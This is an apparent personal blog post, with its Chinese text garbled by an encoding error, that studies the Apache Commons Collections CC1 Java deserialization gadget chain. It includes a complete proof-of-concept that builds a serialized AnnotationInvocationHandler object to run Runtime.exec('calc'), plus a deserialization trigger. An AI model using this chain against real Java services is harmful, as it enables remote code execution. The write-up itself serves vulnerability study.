<p>é¦–å…ˆå°±æ˜¯æˆ‘ä»¬ä¼ é€’è¿›å…¥çš„é‚£ä¸ªæ³¨è§£æˆå‘˜æ˜¯ä¸èƒ½æ˜¯ç©ºçš„ï¼Œæ¯”å¦‚Overrideæ³¨è§£æˆå‘˜å°±æ˜¯ç©ºçš„</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3366919-20241022082455640-13950856.png" class title="image">

<p>æˆ‘ä»¬åªéœ€è¦ä¼ å…¥æˆå‘˜éç©ºçš„æ³¨è§£å³å¯</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3366919-20241022082912342-1051299268.png" class title="image">

<p>ç„¶åæˆ‘ä»¬æ³¨æ„åˆ°è¿™ä¸ªTargetçš„æˆå‘˜åæ˜¯valueï¼Œå‰é¢è¿˜æœ‰ä»£ç </p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">Class&lt;?&gt; memberType = memberTypes.get(name);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ä¼šè·å–æˆ‘ä»¬ä¼ å…¥Mapçš„é”®ï¼Œç„¶åé€šè¿‡é”®å†å»memberTypeä¸­æ‰¾æˆå‘˜ç„¶åå†æ¥åˆ¤æ–­ï¼Œäºæ˜¯æˆ‘ä»¬éœ€è¦ä¼ å…¥valueä¸ºé”®</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3366919-20241022082940638-1007441826.png" class title="image">

<p>ç„¶åå°±æ˜¯ç¬¬äºŒä¸ªåˆ¤æ–­äº†</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(!(memberType.isInstance(value) ||value <span class="keyword">instanceof</span> ExceptionProxy))</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<ol>
<li><strong>ç¡®ä¿ç±»å‹ä¸åŒ¹é…</strong> - ä¼ å…¥ä¸æ³¨è§£æˆå‘˜ç±»å‹ä¸åŒçš„å¯¹è±¡</li>
<li><strong>ç¡®ä¿ä¸æ˜¯ExceptionProxy</strong> - ä¼ å…¥æ™®é€šå¯¹è±¡</li>
</ol>
<p>è¿™ä¸ªåº”è¯¥æ˜¯é»˜è®¤å°±æ˜¯å¯ä»¥è§¦å‘çš„</p>
<h4 id="3-setValueé‡Œçš„valueä¸å¯æ§çš„é—®é¢˜"><a href="#3-setValueé‡Œçš„valueä¸å¯æ§çš„é—®é¢˜" class="headerlink" title="3.setValueé‡Œçš„valueä¸å¯æ§çš„é—®é¢˜"></a>3.setValueé‡Œçš„valueä¸å¯æ§çš„é—®é¢˜</h4><p>è¿™ä¸ªæ˜¯setValueçš„å‚æ•°</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(annotationType.members().get(name))</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è¿™ä¸ªä¸€çœ‹å°±ä¸å¯æ§ï¼Œå¥½åƒæ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ”¹çš„åœ°æ–¹</p>
<p>ç„¶åå¤§ä½¬è¯´æ˜¯ç”¨ConstantTransformerçš„æ„é€ æ–¹æ³•å’Œé‡å†™çš„Transformeræ¥è§£å†³ï¼Œæˆ‘ä»¬å»çœ‹ä¸‹</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<p>è¿™ä¸ªtransformæ–¹æ³•å¯ä»¥ç›´æ¥è¿”å›æˆ‘ä»¬çš„è¾“å…¥ï¼Œä½†æ˜¯è¿˜æ˜¯çœ‹ä¸æ‡‚ï¼Œè®©æˆ‘é‡æ–°æ•´ç†ä¸€ä¸‹</p>
<p>é¦–å…ˆæˆ‘ä»¬æ˜¯æ²¡æœ‰åŠæ³•ç›´æ¥æ”¹å˜setValueçš„å‚æ•°äº†ï¼Œäºæ˜¯æˆ‘ä»¬åªèƒ½é€‰æ‹©æ‰§è¡ŒsetValueæ–¹æ³•ï¼Œç„¶åæˆ‘ä»¬ç»§ç»­æœ€ç»ˆsetValueçš„å‚æ•°ï¼Œå‘ç°å…¶å‚æ•°æ˜¯ä½œä¸ºchecksetValueçš„å‚æ•°ï¼Œç„¶åchecksetValueåˆæŠŠå‚æ•°ä¼ é€’ä¸ªæœ€åçš„transformæ–¹æ³•ä½œä¸ºç±»ï¼Œäºæ˜¯æˆ‘ä»¬ç›´æ¥é€šè¿‡å‚æ•°æ¥è‚¯å®šæ˜¯ä¸è¡Œçš„</p>
<p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±æƒ³èµ·äº†è§£å†³åºåˆ—åŒ–é—®é¢˜çš„æ—¶å€™ä½¿ç”¨åˆ°çš„ChainedTransformerç±»äº†ï¼Œå¯ä»¥é€šè¿‡å†™å…¥æ•°ç»„çš„æ–¹å¼è°ƒç”¨å„ä¸ªç±»çš„transformæ–¹æ³•ï¼Œå½“åˆæˆ‘ä»¬æ˜¯æ‰‹åŠ¨ä¼ å…¥äº†ä¸€ä¸ªåå°„</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chainedTransformer.transform(Runtime.class);    </span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬åªè¦æœ‰ä¸€ä¸ªtransformæ–¹æ³•å¯ä»¥è¿”å›è¿™ä¸ªåå°„å³å¯å®ç°é€šè¿‡è°ƒç”¨ChainedTransformerçš„transformæ¥å®ç°å‘½ä»¤æ‰§è¡Œï¼Œè€ŒåŸå…ˆsetValueé‚£æ¡ç”¨äºè§¦å‘å‡½æ•°æ‰§è¡Œtransformçš„è·¯çº¿æ”¹å˜æ–¹å‘ç”¨æ¥è§¦å‘ChainedTransformerçš„transformæ¥å†æ¬¡è§¦å‘InvokerTransformerçš„transformè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p>äºæ˜¯æˆ‘ä»¬åˆ©ç”¨ConstantTransformerçš„æ„é€ æ–¹æ³•å’Œtransformeræ¥è¿”å›Runtime.class</p>
<p>ç›´æ¥æ¥çœ‹Pocé“¾</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åºåˆ—åŒ–InvokerTransformerï¼Œåå°„è°ƒç”¨execå‡½æ•°æ‰§è¡Œå‘½ä»¤ã€‚</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Mapç±»çš„æ„å»ºä¸ä¿®é¥°</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; inmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        inmap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outmap</span> <span class="operator">=</span> TransformedMap.decorate(inmap,<span class="literal">null</span>,chainedTransformer);<span class="comment">//åˆ°checkSetValueçš„æ—¶å€™è§¦å‘chainedTransformerçš„transformer</span></span><br><span class="line"><span class="comment">//ç„¶ådecorateè¿”å›çš„æ˜¯ä¸€ä¸ªTransformedMapå¯¹è±¡ï¼Œç„¶åå°†åé¢è¦ç”¨åˆ°çš„inmapå†™å…¥å¯¹è±¡ä¸­</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//éå†mapï¼Œè§¦å‘é“¾å­</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">handler</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructorhandler</span> <span class="operator">=</span> handler.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructorhandler.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructorhandler.newInstance(Target.class,outmap);</span><br><span class="line"><span class="comment">//å†™å…¥æˆ‘ä»¬å‡†å¤‡å¥½çš„å‚æ•°å’Œç”¨äºè°ƒç”¨è¿‡ifåˆ¤æ–­å’Œè°ƒç”¨setValueçš„TransformedMapå¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œç„¶åé€šè¿‡åå°„è·å–å¯¹è±¡</span></span><br><span class="line">        serialize(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;serialize&quot;</span>));<span class="comment">//è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>ç„¶åæœ€åæˆ‘å†æ€»ç»“ä¸€ä¸‹è¿™ä¸ªé“¾å­çš„è§¦å‘æµç¨‹</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é€šè¿‡åå°„è·å–AnnotationInvocationHandlerå¯¹è±¡-&gt;åºåˆ—åŒ–-&gt;ååºåˆ—åŒ–çš„æ—¶å€™è§¦å‘readObjectæ–¹æ³•-&gt;è¿‡ä¸¤ä¸ª<span class="keyword">if</span>åˆ¤æ–­-&gt;ä¼šéå†æˆ‘ä»¬çš„ä¼ å…¥çš„TransformedMapå¯¹è±¡çš„é”®å€¼å¯¹è°ƒç”¨setValueæ–¹æ³•-&gt;éå†åˆ°MapEntryçš„æ—¶å€™è§¦å‘setValueæ–¹æ³•-&gt;è§¦å‘TransformedMapçš„checkSetValueæ–¹æ³•-&gt;è°ƒç”¨ChainedTransformerçš„transformæ–¹æ³•-&gt;é€šè¿‡æ•°ç»„ä¸­çš„æ“ä½œè¿›è¡Œå‘½ä»¤æ‰§è¡Œ</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>





<h2 id="4-æ€»ç»“"><a href="#4-æ€»ç»“" class="headerlink" title="4.æ€»ç»“"></a>4.æ€»ç»“</h2><p>æœ€åå†æä¾›ä¸€ä¸‹è§¦å‘ä»£ç æ¥å®è·µä¸€ä¸‹æˆæœ</p>
<div class="code-container" code-lang="Java"><div class="codebox"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">unserializeTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] arge)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">    unserialize(<span class="string">&quot;serialize&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>è¿™ä¸ªä»£ç è¯»å–å½“å‰ç›®å½•ä¸‹çš„serializeæ–‡ä»¶ç„¶åå¼¹å‡ºè®¡ç®—å™¨</p>
<img lazyload src="/assets/images/Meow-Loading.webp" data-lazy-src="/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20251007164644886.png" class title="image-20251007164644886">

<p>èŠ±äº†æˆ‘ä¸‰å¤©å¤šçš„æ—¶é—´ç»ˆäºæŠŠè¿™ä¸ªé“¾ä¸ªå¤åŸäº†ï¼Œè™½ç„¶å…¨æ˜¯è·Ÿç€å¤§ä½¬æ¥ï¼Œè‡ªå·±æ²¡å†™å¤šå°‘ä»£ç ï¼Œè¿™å°±æ˜¯åˆå­¦è€…çš„ç—›å—ï¼Œç´¯æ­»æˆ‘äº†</p>
</div><div class="post-reward"><div class="post-reward-btn" title="èµèµä½œè€…"><img src="/assets/images/svg/uc/uc-gift.svg" class="icon noview" alt="Icon"><span></span></div><div class="post-reward-content"><div class="post-reward-text"></div><div class="post-reward-list"><a href="/null" target="_blank">è‡´è°¢åå•</a></div></div></div><div class="post-copyright"><div class="post-copyright-info">æœ¬ä½œå“ç”± Regulus äº 2025-10-01 21:23:45 å‘å¸ƒ</div><div class="post-copyright-link"><span>ä½œå“åœ°å€ï¼š<a href="http://example.com/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">JAVAååºåˆ—åŒ–</a></span><button class="copy-text" type="button" data-text="http://example.com/2025/10/01/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">å¤åˆ¶</button></div><div class="post-copyright-detail">é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œæœ¬ç«™ä½œå“å‡é‡‡ç”¨ <a href='https://creativecommons.org/licenses/by-nc-sa/4.0/' title='Attribution-NonCommercial-ShareAlike' target='_blank'>CC BY-NC-SA 4.0</a> è®¸å¯åè®®ï¼Œè½¬è½½è¯·æ³¨æ˜æ¥è‡ª <a href='/'>Meiçš„å°çª</a></div><img class="post-copyright-icon noview" src="/assets/images/Hexo-Theme-MEOW.png" alt="Logo"/></div><div class="post-tail-tags"></div></div><aside id="post-sidebar" status="show"><div id="toc-container"><div class="toc-title"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"><span>ç›®å½•</span></div><div class="toc-content" id="toc-div"><ol class="toc-list"><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-list-text">JAVAååºåˆ—åŒ–æ¼æ´</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#1-JAVA%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-list-text">1.JAVAåºåˆ—åŒ–</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#2-%E6%BC%8F%E6%B4%9E%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0"><span class="toc-list-text">2.æ¼æ´äº§ç”ŸåŸå› </span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#3-CC1%E9%93%BE"><span class="toc-list-text">3.CC1é“¾</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#1-%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-list-text">1.è§¦å‘ç‚¹</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#2-%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-list-text">2.åˆ©ç”¨é“¾</span></a></li><li class="toc-list-item toc-list-level-3"><a class="toc-list-link" href="#3-%E5%BA%8F%E5%88%97%E5%8C%96%E9%97%AE%E9%A2%98"><span class="toc-list-text">3.åºåˆ—åŒ–é—®é¢˜</span></a></li></ol></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#4-%E6%80%BB%E7%BB%93"><span class="toc-list-text">4.æ€»ç»“</span></a></li></ol></li></ol></div></div></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="æ·±è‰²æ¨¡å¼" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="åˆ†äº«" type="button" 